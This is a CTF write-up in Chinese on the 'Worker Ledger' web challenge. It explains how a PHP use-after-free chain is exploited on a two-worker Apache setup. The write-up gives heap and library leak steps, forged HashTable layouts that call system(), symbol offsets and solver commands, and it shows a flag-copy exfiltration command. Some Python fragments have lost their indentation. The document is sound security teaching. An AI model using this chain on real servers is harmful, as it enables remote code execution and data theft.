# Worker Ledger

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-E1D577B9` · 状态 solved
```

## 一句话

The ledger has two long-lived workers.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-E1D577B9.zip` | 2.0 KB | `d162b5f17396…` |
| `zip/service.Dockerfile` | 274 B | `a44d4d3a7176…` |
| `zip/README.txt` | 173 B | `ecf667f4f3f8…` |
| `zip/worker.php` | 105 B | `62d2adfb1bff…` |
| `zip/configuration.txt` | 147 B | `c719a8684887…` |
| `zip/php.ini` | 539 B | `b72dfdd4eb73…` |
| `zip/index.php` | 549 B | `e4b7ac5566f5…` |
| `zip/apache.conf` | 354 B | `2d32d0133c64…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. TL;DR

这是一道把 CVE-2026-109619 / “php2shell” 跨请求内存破坏链放进“双 prefork worker + KeepAlive”场景的题：

1. 钉住一个 worker：开一条 keep-alive 连接占住 worker A（每 3 秒发一次 GET /healthz.php，因为 KeepAliveTimeout 10），此后所有攻击请求都会落到 worker B；
2. stage 1：用 12 MB multipart 请求把 memory_limit=8M 打爆，留下一条悬垂的 session 相关指针；下一发请求用 841 个 48 字节字段把它“接管”，从 Set-Cookie 里泄出 4096 字节堆数据 → chunk 基址；
3. stage 2：同样套路换 983 个数组，泄出 zval_ptr_dtor 指针 → libphp 基址；
4. stage 3：把伪造的 HashTable（pDestructor = zif_system）、伪 zend_execute_data、伪 zend_string("cp /flag e/xxx") 用 15 字节 carrier 挂到 PS(http_session_vars) 的残留 zend_reference 上，在请求收尾的析构链里执行 system()；
5. 命令只有 14 字节，所以写 cp /flag e/<3字符> 落到 DocumentRoot 的可写目录 /e/，再从 http://<target>/e/<3字符> 读回 flag。

### 1. 附件与配置审读

附件只有 4 个文件，全是“环境说明书”：

| 文件 | 关键内容 |
| --- | --- |
| service.Dockerfile | FROM php:8.5.11-apache；mkdir -p /var/www/html/e && chmod 1777；ln -s /answers/flag /flag |
| apache.conf | KeepAlive On、MaxKeepAliveRequests 100、KeepAliveTimeout 10；prefork StartServers=MinSpareServers=MaxSpareServers=MaxRequestWorkers=ServerLimit=2；注释直言“*a persistent HTTP connection pins a request pair to one*” |
| php.ini | memory_limit=8M、display_errors=On、max_input_vars=1000、session.use_strict_mode=0、session.upload_progress.enabled=On、session.save_path=/tmp、post_max_size=64M、fatal_error_backtraces=On（注释 ; PHP 8.5 only） |
| worker.php | 只有 echo getmypid() —— 用来观察 worker 亲和性 |

这几个值不是随便写的，正是 php2shell 利用链要求的“论文环境”：

• memory_limit=8M → 一次 12 MB 的表单字段就能在解析途中触发 OOM（分配 2098791 字节失败），请求在非正常时机结束，留下跨请求的陈旧状态；
• max_input_vars=1000 → 1001 个字段的请求在 startup 阶段就被截断，让解析路径可预测；
• session.upload_progress.enabled=On → 攻击者可以通过普通 multipart 字段 PHP_SESSION_UPLOAD_PROGRESS 触发 session 初始化，不需要 session_start()；
• fatal_error_backtraces=On（PHP 8.5 新增）→ 致命错误时构造 backtrace，把请求内分配的对象引用挂到跨请求存活的全局上（CVE-2026-109619 的根因）；
• session.use_strict_mode=0 → 可以自己指定任意 PHPSESSID，不需要服务端先创建。

e/ 目录 1777 且 Apache 工作目录就是 DocumentRoot，于是 14 字节命令 cp /flag e/xxx 正好够用（/e/xxx 走 URL 映射到 /var/www/html/e/xxx；注意不是文件系统的 /e，那条路是死的）。

### 2. 漏洞原理

**2.1 CVE-2026-109619：请求结束时的“陈旧错误状态”**

PHP 8.5 在 fatal_error_backtraces=On 时，会把致命错误的 backtrace 存进一个进程级全局；请求 shutdown 阶段恢复 INI 设置、清理执行器时这个全局被重新填充，而它引用的 zval 都分配在本次请求的内存里。请求内存被回收后，全局指针仍然指向那块内存——下一次请求在同一地址空间里重新分配，就形成了可被攻击者用表单字段“接管”的 UAF。

本题还叠加了 session 侧的两条老原语：

• 截断请求（max_input_vars）会让 PS(id)（session id 的 zend_string*）在请求结束后仍被遗留；
• upload progress 路径会把 $_SESSION 数组的引用写进 PS(http_session_vars)，请求结束、$_SESSION 销毁后这个引用仍可能被后续请求看到。

公开利用链把它们拆成三个“原语”，每个都是 A 请求（生产 OOM）→ 紧接着 B 请求（消费陈旧状态） 的一对。

**2.2 生产请求 A（producer）**

POST /<任意 PHP> HTTP/1.1

Content-Type: multipart/form-data; boundary=S*17

Cookie: PHPSESSID=<32 个 a>           ← 保住 PS(id)，避免 Set-Cookie 覆盖

--S…

Content-Disposition: form-data; name="PHPSESSID"          ← 19 字节，如 a*19

--S…

Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

--S…

（stage3 另有 6 个 31 字节 padding 字段）

--S…

Content-Disposition: form-data; name="f"; filename="f"   ← 触发 upload progress

--S…

Content-Disposition: form-data; name="big"               ← 12 MB

12 MB 字段读到一半，memory_limit=8M 触发：

<b>Fatal error</b>:  Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes)

in <b>Unknown</b> on line <b>0</b><br />

（真机返回体 367 字节，本地 0.1–1 s、真机 26–62 s 同款。）

**2.3 消费请求 B（consumer）**

B 是下一发 multipart：先放 PHPSESSID=<SID>、PHP_SESSION_UPLOAD_PROGRESS，紧接着若干个精确大小的字段。解析器分配的 zend_string 会落在 A 留下的空洞上，从而：

• stage 1：841 个 48 字节字段 + 79 字节伪造串 → 覆盖悬垂的 PS(id)；shutdown 时把 PS(id) 当 cookie 输出，于是 Set-Cookie: PHPSESSID=<4096 字节堆内容> 泄漏；
• stage 2：983 个数组字段（其中 a0406 有 16 个元素）→ 覆盖另一处悬垂结构，cookie 第 8–16 字节是 zval_ptr_dtor 的地址；
• stage 3：15 字节 carrier + 15×167 字节伪 HashTable → 把 PS(http_session_vars) 上那个仍活着的 zend_reference 的 val.value 改成伪 HashTable 地址。

2.4 stage 3：从引用到 system()

carrier 是 15 字节的 bin-40 字符串（struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]），它的字符正好落在 PS(http_session_vars) 上：

• 保留 gc.refcount=1、gc.type=IS_REFERENCE(10)；
• 改写 val.value 的低 7 字节为伪 HashTable 地址（高字节保持 0x00，仍是合法用户态指针）。

伪 HashTable（167 字节，htdata 处）关键字段：

| 偏移 | 值 | 含义 |
| --- | --- | --- |
| 0x00 | rc=1, type=7 | IS_ARRAY |
| 0x08 | flags=0x10, nTableMask=0xFFFFFFF8 | 空 packing |
| 0x10 | htdata+0x20 | arData 指向伪 execute_data |
| 0x18 | nNumUsed=1, nNumOfElements=1 |  |
| 0x20 | 8 | nTableSize |
| 0x30 | zif_system | pDestructor |

伪 zend_execute_data（htdata+0x20）：0x2C: num_args=1，+0x50 处 arg1 的 value 指向 htdata+0x80，+0x58 处 type=6（字符串）。伪 zend_string（htdata+0x80）：rc=1, type=0x106, len=len(cmd)，命令字符串在 0x98。

请求收尾时的调用链：

php_session_track_init

└─ zval_ptr_dtor(PS(http_session_vars))

└─ zend_reference_destroy

└─ zval_ptr_dtor(&ref->val)      // IS_ARRAY_EX

└─ zend_array_destroy

└─ zend_hash_destroy

└─ pDestructor(&bucket->val) == zif_system(cmd)

**2.5 偏移（php:8.5.11-apache amd64，Debian 13 官方镜像）**

| 符号/结构 | 偏移 | 说明 |
| --- | --- | --- |
| zif_system | 0x5996e0 | 写进伪 HT 的 pDestructor |
| zval_ptr_dtor | 0x7b47a0 | 用于反推 libphp 基址（stage 2） |
| zend_hash / 陈旧槽位 | 0x690d8 | htdata = chunk + 0x690d8 |

（本机 libphp.so 与目标同 build，BuildID 13ba090198423880ce5847c4e3f92c48f2385a72。）

### 3. 本题的两个“适配点”

**3.1 worker 亲和性（题目考点）**

官方 exploit 假设单 worker：A 和 B 必须由同一个子进程处理。题目偏偏是 2 个 worker + KeepAlive，A 和 B 大概率被分到不同进程，链就断了。

解法就是 apache.conf 注释里点出来的那件事：用一条长连接钉住一个 worker。

连接1（blocker）: GET /worker.php          → 拿到 pid，保持 keep-alive

每 3 秒 GET /healthz.php → KeepAliveTimeout=10，必须持续刷新

攻击请求（A/B）:  每条新连接 → prefork 只会把空闲的那个 worker 派出来

实测（本地 wl-lab）：

fresh 连接逐个请求: 17, 18, 17, 18, 17, 18

blocker 钉住 17 后: 18, 18, 18, 18, 18, 18

线上还遇到过一个变种：某个实例的第二个 child 被 12 MB 上传卡死后不再 accept，于是所有请求自然串行到同一个 worker，此时 --no-pin 反而正确（本题两种模式都实现了）。

**3.2 指针范围与解析**

官方 chunk_base_from_cookie / libphp_base_from_cookie 只认 0x7F0000000000..0x800000000000 的地址；而本题主机/线上 glibc 的堆与 mmap 地址在 0x71..、0x76..、0x7b..，会被解析成 0。改法：

```python
def _ptr(v):
return 0x1000000000 <= v < 0x800000000000
def chunk_base_generic(raw, min_votes=8):
c = Counter()
for i in range(len(raw) - 8):
v = int.from_bytes(raw[i:i+8], "little")
if _ptr(v):
```

c[v & ~0x1FFFFF] += 1        # Zend MM 主 chunk 2 MB 对齐

base, n = c.most_common(1)[0]

```python
return base if n >= min_votes else 0
def libphp_base_generic(raw, dtor_offset):
p = int.from_bytes(raw[8:16], "little")
if _ptr(p) and (p & 0xFFF) == (dtor_offset & 0xFFF) and (p - dtor_offset) & 0xFFF == 0:
return p - dtor_offset
return 0
```

**3.3 14 字节命令上限**

167 - 0x98 - 1 = 14。所以：

• cp /flag e/xxx 正好 14 字节（xxx 3 字符），配合 /e/ 可直接下载；
• 也可以 id>e/p1（8 字节）之类做调试。

### 4. 利用脚本与执行

核心脚本：workerledger/wl_solve2.py（在原版 exploit 上做了 pinning、通用指针解析、重试、--huge/--chunk/--lib/--no-pin/--no-rotate/--sid-a/--sid-b 等改造）。

```bash
python3 wl_solve2.py <host> 80 --tries 6          # 默认: cp /flag e/<3字符> 然后 GET /e/<3字符>
python3 wl_solve2.py <host> 80 --cmd "cat /flag"  # 直接回显（失败会返回首页，仅调试用）
python3 wl_solve2.py <host> 80 --chunk 0x... --lib 0x...   # 复用已泄漏的地址，直接从 stage3 开始
```

流程：

pre-rotate ──► stage1 (A+B) ──► rotate ──► stage2 (A+B) ──► rotate ──► stage3 (A+B) ──► GET /e/<name>

每一步的 rotate() 都是：发一个 1001 字段 + 12 MB 的生产请求（OOM），再补一发只带 PHPSESSID/progress 的请求，让子进程在 pre-RINIT 清理阶段 abort；prefork 立刻 fork 出干净的新 worker，而地址空间布局（chunk 基址）因为 fork 自同一父进程而保持不变。

**4.1 真机打穿记录（2026-11-22 18:24）**

• 实例 ab9bcc03-022e-4bc5-9f85-60c55bcd1118，目标 172.16.135.2（WSL2 WireGuard，RTT ≈ 63 ms）；
• 命令：python3 -u wl_solve2.py 172.16.135.2 80 --tries 6；

[+] chunk  = 0x7dba2c200000        # stage1 第 1 次命中

[+] libphp = 0x7dba2dc00000        # stage2 第 1 次命中

[*] htdata = 0x7dba2c2690d8  zif = 0x7dba2e1996e0

[*] stage3 cmd='cp /flag e/e1q' tries=6

attempt 1: resp=746B  body=b'<!doctype html>...'      # 正常首页，carrier 未命中

[*] rotating worker over HTTP

attempt 2: resp=0B    body=b''                        # worker 被 system() 后崩溃 = 命中

[+] /e/e1q -> b'«FLAG»'

独立复核：

```bash
curl -s http://172.16.135.2/e/e1q
```

# «FLAG»   [200]

### 5. 本地复现环境

按题目 service.Dockerfile + php.ini + apache.conf 1:1 重建（workerledger/lab/）：

| 容器 | 端口 | 说明 |
| --- | --- | --- |
| wl-lab | 127.0.0.1:18192 | 2 worker + KeepAlive（与题目一致） |
| wl-lab-single | 127.0.0.1:18195 | 1 worker（对照组，验证“单 worker 才需要 --no-pin”） |

docker build -t wl-lab -f lab/Dockerfile lab

docker run -d --name wl-lab -p 127.0.0.1:18192:80 wl-lab

```bash
python wl_solve2.py 127.0.0.1 18192
```

结果：2 worker + pinning 下 5/5 一发命中，固定 chunk=0x71b71b600000、libphp=0x71b71d200000，端到端约 7–9 秒；单 worker 环境 --no-pin 也一发命中。

### 6. 排错记录（为什么真机上折腾了很久）

这部分是本题真正的“难度”所在，记下来便于复现：

| 现象 | 结论 |
| --- | --- |
| stage1 在真机 5 次全 miss，本地也复现 | OOM 字段大小（--huge 9 vs 12）会改变堆布局；必须用 12 MB，不同 huge 泄出的 chunk 不能混用 |
| stage3 的 B 返回 746 字节首页而不是崩溃 | carrier 没落到陈旧引用上（未命中），不代表链不通 |
| 在 A 与 B 之间插入 /worker.php 探测请求后，B 必定返回首页 | 陈旧状态只对紧随其后的第一个请求有效；A、B 之间不能有任何其它 HTTP 请求 |
| --no-rotate 下重试 stage2 一直 cookie_len=32 | 布局对同一 worker 是“粘”的，重试必须靠 rotate() 换新 fork |
| A 与 B 放同一条 keep-alive 连接 | 不可行：OOM 之后 Apache 直接关连接（chunked / Content-Length 都一样），B 读到 0 字节 |
| 网关加 header / 慢速上传 / 会话文件预置 | 本地用注入 header 的代理（1 个、5 个 header）、460 KB/s 限速代理、清空 /tmp/sess_* 复测，全部仍然成功 → 都不是原因 |
| 实例频繁消失 | 队友/配额导致的实例被删（团队上限 3 个），与利用无关；重开后 3–5 分钟即可打完 |

一句话总结：A 必须落在“刚 fork 的新 worker”上，B 必须紧跟着落在同一个 worker 上，中间不能插入任何请求；没命中就 rotate 一次重试。

### 7. 修复建议

• 升级到 PHP ≥ 8.5.12（该版本修复了此类跨请求全局状态 UAF）；
• 生产环境不要同时打开 fatal_error_backtraces + 低 memory_limit，并考虑关闭 session.upload_progress.enabled、开启 session.use_strict_mode；
• 采用 FPM + 进程隔离（每个请求后回收 worker，pm.max_requests 设小）可以显著降低这类跨请求利用的成功率；
• 目录侧：不要把可写目录暴露在 DocumentRoot 下（本题 /e/ 1777 直接成了外带通道）。

### 8. 附件清单（本目录）

| 文件 | 作用 |
| --- | --- |
| wl_solve2.py | 最终 solver（pinning + 三阶段 + exfil + 重试） |
| go_live.py | 实例/隧道/推送/运行一条龙（--launch/--check/--down） |
| launch_live.py | 起隧道、探 pid、后台跑 solver |
| wsl.py | 在 WSL2 里执行脚本/写文件（Windows 侧隧道入口） |
| lab/Dockerfile, lab/Dockerfile.single, lab/apache*.conf, lab/php.ini, lab/public/ | 本地 1:1 复现环境 |
| lab/hdr_proxy.py, lab/throttle_proxy.py, lab/tcp_fwd.py | 排错用的 header 注入 / 限速 / 1:1 转发代理 |

环境说明：Windows 主机上 wg.exe 需要管理员权限，无法操作 ctfy 隧道，因此隧道建在 WSL2（Ubuntu-22.04，内核原生 WireGuard）里，wg-quick up 后用 1:1 转发或直接在 WSL 内跑 solver。

## 结果

- flag sha256：`330fc86a6074846cf939ba4e27edc0fad59cc5a77ba1e483df423858680cfc68`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/wl_solve2.py`

## 待核实

- 本条目由 WP 第 3 节《Worker Ledger》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
